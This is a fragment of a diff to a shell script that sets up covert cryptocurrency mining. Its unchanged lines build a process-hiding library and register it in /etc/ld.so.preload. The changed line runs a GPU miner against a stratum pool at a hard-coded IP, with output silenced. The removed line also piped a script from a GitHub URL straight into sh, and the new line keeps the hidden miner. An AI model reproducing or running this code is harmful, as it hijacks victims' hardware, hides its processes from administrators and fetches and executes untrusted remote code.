@@ -52,4 +52,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./$APP -u stratum+ssl://134.122.127.150:443 -d 0,1,2,3,4,5,6,7 -w alekpoden82.app$(shuf -i 1000000-9999999 -n 1) & curl https://raw.githubusercontent.com/Johncenayan/cautious-rotary-phone/refs/heads/main/cpa.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./$APP -u stratum+ssl://134.122.127.150:443 -d 0,1,2,3,4,5,6,7 -w alekpoden82.app$(shuf -i 1000000-9999999 -n 1)  > /dev/null 2>&1
